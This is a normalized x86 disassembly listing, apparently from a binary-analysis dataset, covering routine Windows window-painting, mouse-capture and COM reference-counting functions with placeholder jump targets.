mov edx [ ecx + 0x1c ]
lea eax [ esi + 0x88 ]
push eax
push eax
push edi
call edx
mov edi [ edi ]
test edi edi
je r-xdata
sub_407580
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and [ eax + 0x6c ] 0xfffffffe
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
xor eax eax
pop ebp
retn 0x8
mov [ eax + 0x48 ] 0x0
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
sub_4075f0
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x6c ] 0xffffffef
xor eax eax
pop ebp
retn 0x8
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi - 0x28 ]
push eax
call [ SetCapture@IAT ]
or [ esi + 0x6c ] 0x10
pop esi
xor eax eax
pop ebp
retn 0x8
sub_407670
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
mov eax 0x80004003
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebx - 0x28 ]
push eax
call [ GetDC@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
pop esi
mov eax 0x80004005
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
test [ ebp + 0x10 ] 0x1
mov [ ebx + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebx - 0x28 ]
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call [ GetClientRect@IAT ]
test [ ebp + 0x10 ] 0x4
je r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov eax [ esi ]
push edi
push eax
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi ]
push 0x6
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ FillRect@IAT ]
pop edi
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ esi ]
push ecx
push edx
push eax
call [ CreateCompatibleBitmap@IAT ]
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
push eax
push edi
call [ SelectObject@IAT ]
test eax eax
jne r-xdata
push edi
call [ DeleteDC@IAT ]
jmp r-xdata
push eax
call [ DeleteObject@IAT ]
mov edx [ esi ]
mov [ ebx + 0x2c ] edx
mov [ esi ] edi
mov ecx [ ebp - 0x18 ]
push ecx
call [ DeleteObject@IAT ]
push edi
call [ DeleteDC@IAT ]
jmp r-xdata
sub_407780
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x2c ] 0x0
push edi
mov edi [ ebp + 0xc ]
mov [ esi + 0x30 ] 0x1
je r-xdata
mov ecx [ esi - 0x28 ]
push edi
push ecx
call [ ReleaseDC@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esi - 0x28 ]
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
push 0xcc0020
push 0x0
push 0x0
push edi
sub edx eax
push edx
mov edx [ ebp - 0xc ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x2c ]
push ecx
push eax
call [ BitBlt@IAT ]
push edi
call [ DeleteDC@IAT ]
mov edi [ esi + 0x2c ]
sub_407810
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
mov eax [ edx - 0x28 ]
push ecx
push eax
call [ InvalidateRgn@IAT ]
xor eax eax
pop ebp
retn 0xc
sub_407830
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ eax - 0x28 ]
mov eax [ eax - 0xc ]
push ecx
push edx
push eax
call [ CallWindowProcW@IAT ]
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn 0x14
sub_407890
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
push ecx
push r--data
push eax
mov eax [ edx ]
call eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_407920
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push eax
push ecx
mov eax r--data
call sub_40a210
pop edi
pop ebp
retn 0xc
sub_407950
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec [ ecx + 0x18 ]
push esi
mov esi [ ecx + 0x18 ]
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
push 0x1
call edx
sub_407980
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
push edi
test esi esi
je r-xdata
mov [ edx ] 0x0
pop edi
mov eax 0x80004003
pop esi
pop ebp
retn 0x10
mov edi [ ebp + 0xc ]
cmp edi 0x1
jbe r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
test edx edx
je r-xdata
pop ebx
pop edi
mov eax 0x80004005
pop esi
pop ebp
retn 0x10
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x10 ]
test ecx ecx
je r-xdata
sub eax ecx
sar eax 0x2
mov [ ebp + 0x14 ] 0x0
cmp edi eax
jbe r-xdata
jb r-xdata
mov [ ebp + 0x14 ] 0x1
test edx edx
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov [ edx ] edi
mov eax [ ebp + 0x14 ]
pop ebx
pop edi
pop esi
pop ebp
retn 0x10
lea ebx [ ebx ]
push 0x80004005
call sub_402d00
test eax eax
je r-xdata
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
add [ ebx + 0x10 ] 0x4
add esi 0x4
test edi edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ ebx + 0x10 ]
dec edi
test esi esi
je r-xdata
sub_407a50
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0xc ]
sub eax edx
push esi
mov esi [ ebp + 0xc ]
sar eax 0x2
cmp esi eax
ja r-xdata
lea edx [ edx + eax * 4 ]
mov [ ecx + 0x10 ] edx
xor ecx ecx
cmp esi eax
setne cl
pop esi
mov eax ecx
pop ebp
retn 0x8
mov eax esi
sub_407aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_448187
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
mov ecx [ rw-data ]
mov [ esi ] r--data
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_407b30
push ebp
mov ebp esp
push 0xffffffff
push sub_448aa0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ edi ] ebx
mov esi 0x8007000e
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x1c
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push eax
call sub_407aa0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
mov [ edi ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
sub_407bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_447130
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] 0x3
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ ebp + 0xc ]
sar eax 0x2
xor ecx ecx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_443fa9
add esp 0x4
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ ebp + 0x18 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
push edi
mov ecx [ eax + 0x4 ]
call ecx
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ esi + 0x4 ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub ebx edi
sar ebx 0x2
mov eax [ esi + 0x8 ]
lea ecx [ eax + ebx * 4 ]
mov [ esi + 0xc ] ecx
jmp r-xdata
lea ebx [ ebx ]
mov edi [ ebp + 0x14 ]
cmp [ esi + 0x4 ] edi
je r-xdata
push 0x80004005
call sub_402d00
test edi edi
je r-xdata
mov eax [ edi ]
mov [ ecx ] eax
test eax eax
je r-xdata
add [ esi + 0x10 ] 0x4
add edi 0x4
cmp edi ebx
jne r-xdata
mov ecx [ eax ]
push eax
mov edx [ ecx + 0x4 ]
call edx
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov edi [ ebp + 0xc ]
sub_407d40
push ebp
mov ebp esp
push 0xffffffff
push sub_449774
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
mov eax 0x80004003
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x14 ]
push eax
mov [ ecx ] 0x0
call sub_407b30
test eax eax
js r-xdata
mov esi [ ebp + 0x8 ]
test [ esi + 0x14 ] 0x2
je r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
mov [ ebp + 0x8 ] esi
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov ebx 0x1
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
mov ebx 0x2
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov [ ebp - 0x10 ] ebx
mov eax [ eax ]
mov ecx [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
push 0x0
push eax
mov eax [ esi + 0xc ]
push eax
push ecx
push edx
call sub_407bf0
mov edi eax
mov eax 0x1
mov [ ebp - 0x4 ] eax
test bl 0x2
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
test bl 0x1
je r-xdata
and ebx 0xfffffffd
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
js r-xdata
and ebx 0xfffffffe
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ esi + 0x10 ]
push edx
mov [ eax + 0x10 ] ecx
push eax
mov edi r--data
mov eax r--data
call sub_40a210
mov edi eax
test edi edi
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax edi
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
push 0x1
call edx
sub_407ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_447112
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ rw-data ]
mov [ esi + 0x18 ] 0xc0000001
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_407f20
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_407f20
push ebp
mov ebp esp
push 0xffffffff
push sub_4453e5
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
test [ edi + 0x14 ] 0x2
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ edi + 0x8 ]
cmp esi [ edi + 0xc ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ edi + 0x8 ]
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
nop
add esi 0x4
cmp esi [ edi + 0xc ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
je r-xdata
sub_407fc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4465e8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_407f20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_408010
push ebp
mov ebp esp
push 0xffffffff
push sub_448a80
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
xor esi esi
cmp ebx esi
jne r-xdata
mov [ ebx ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] esi
push 0x1c
call [ operator new@IAT ]
add esp 0x4
cmp eax esi
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push eax
call sub_407aa0
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x18 ] ecx
lea ecx [ eax - 0x34 ]
push 0x3
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
push eax
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
push esi
call sub_407bf0
mov edi eax
test edi edi
js r-xdata
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
push 0x1
mov ecx esi
mov eax [ edx + 0x1c ]
call eax
mov eax [ esi ]
push ebx
push r--data
push esi
mov ecx [ eax ]
call ecx
mov edi eax
test edi edi
jns r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4080a5
mov ebx [ ebp + 0x10 ]
mov esi [ ebp - 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x18 ] ecx
lea ecx [ eax - 0x34 ]
push 0x3
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
push eax
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
push esi
call sub_407bf0
mov edi eax
test edi edi
js r-xdata
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
push 0x1
mov ecx esi
mov eax [ edx + 0x1c ]
call eax
mov eax [ esi ]
push ebx
push r--data
push esi
mov ecx [ eax ]
call ecx
mov edi eax
test edi edi
jns r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408180
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
lea esi [ edi - 0x38 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
xor esi esi
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp [ esi + 0x3c ] ebx
je r-xdata
test ebx ebx
pop ebx
jne r-xdata
mov edx [ eax ]
lea ecx [ edi + 0xa4 ]
push ecx
push r--data
push eax
mov eax [ edx ]
call eax
mov esi eax
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
push ebx
call ecx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ edi + 0xa4 ]
test eax eax
je r-xdata
mov [ esi + 0x3c ] ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ edi + 0xa4 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_408210
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor edx edx
lea edx [ eax - 0x38 ]
jmp r-xdata
pop ebp
retn 0xc
mov eax [ edx + 0x3c ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x80004003
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov eax 0x80004005
mov edx [ eax ]
mov edx [ edx ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
call edx
pop ebp
retn 0xc
sub_408260
push ebp
mov ebp esp
push 0xffffffff
push sub_449ed8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_40a550
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_408300
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov ecx [ ecx + 0x9c ]
mov eax 0x80004002
test ecx ecx
je r-xdata
mov eax 0x80004003
pop ebp
retn 0x10
pop ebp
retn 0x10
mov eax [ ecx ]
mov eax [ eax + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push ecx
call eax
sub_4083b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x80 ]
mov ecx [ ecx + 0x34 ]
shr eax 0x5
and eax 0x1
mov [ ebp + 0x8 ] eax
test ecx ecx
je r-xdata
pop ebp
retn 0x14
mov edx [ ecx ]
push esi
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
mov esi [ eax + 0x4 ]
mov eax [ eax ]
push esi
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
mov ecx [ edx + 0x1c ]
call ecx
mov eax [ ebp + 0x8 ]
pop esi
sub_408400
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
test eax eax
je r-xdata
mov eax 0x80004003
pop ebp
retn 0x8
mov eax [ edx + 0x98 ]
mov [ ecx + 0x4 ] eax
mov edx [ edx + 0x9c ]
mov [ ecx + 0x8 ] edx
xor eax eax
pop ebp
retn 0x8
mov edx [ eax ]
push esi
lea esi [ ecx + 0x8 ]
push esi
add ecx 0x4
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
pop esi
pop ebp
retn 0x8
sub_408450
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x80 ]
mov ecx [ ecx + 0x34 ]
shr eax 0x6
and eax 0x1
mov [ ebp + 0x8 ] eax
test ecx ecx
je r-xdata
pop ebp
retn 0x18
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push ecx
call eax
mov eax [ ebp + 0x8 ]
sub_4084a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push ecx
call eax
sub_4084c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx + 0x2c ]
push ecx
call eax
sub_4084e0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov edx [ ecx ]
neg eax
sbb eax eax
push eax
push ecx
mov ecx [ edx + 0x30 ]
call ecx
sub_408510
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov edx [ ecx ]
neg eax
sbb eax eax
push eax
push ecx
mov ecx [ edx + 0x34 ]
call ecx
sub_408540
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov edx [ ecx ]
neg eax
sbb eax eax
push eax
push ecx
mov ecx [ edx + 0x38 ]
call ecx
sub_408570
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
mov edx [ ecx ]
push esi
neg eax
sbb eax eax
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov esi [ eax + 0xc ]
push esi
mov esi [ eax + 0x8 ]
push esi
mov esi [ eax + 0x4 ]
mov eax [ eax ]
push esi
push eax
push ecx
mov ecx [ edx + 0x3c ]
call ecx
pop esi
sub_4085b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4470cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax + 0x34 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x94 ] 0x1
test edi edi
je r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
push 0x40
lea eax [ ebp - 0x90 ]
push eax
push ecx
call [ StringFromGUID2@IAT ]
lea ecx [ ebp - 0x90 ]
push ecx
call [ SysAllocString@IAT ]
mov ebx eax
mov [ ebp - 0x98 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x14 ]
mov edx [ edi ]
mov edx [ edx + 0x40 ]
lea eax [ ebp - 0x94 ]
push eax
mov eax [ esi + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
push ebx
push eax
mov eax [ esi + 0x4 ]
push ecx
mov ecx [ esi ]
push eax
push ecx
push edi
call edx
mov [ ebp - 0x4 ] 0xffffffff
push ebx
call [ SysFreeString@IAT ]
push 0x8007000e
call sub_402d00
sub_408690
push ebp
mov ebp esp
push esi
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0xc ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp + 0x8 ]
push esi
lea edx [ ecx + ecx ]
push edx
push eax
call [ memcpy_s@IAT ]
add esp 0x10
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_4086c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x1
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov [ edi ] 0x0
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
pop edi
mov eax 0x80004003
pop esi
pop ebp
retn 0xc
mov ecx [ ebx + 0xa0 ]
push ecx
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push edi
push eax
mov eax [ ecx + 0x44 ]
call eax
mov esi eax
test esi esi
js r-xdata
pop ebx
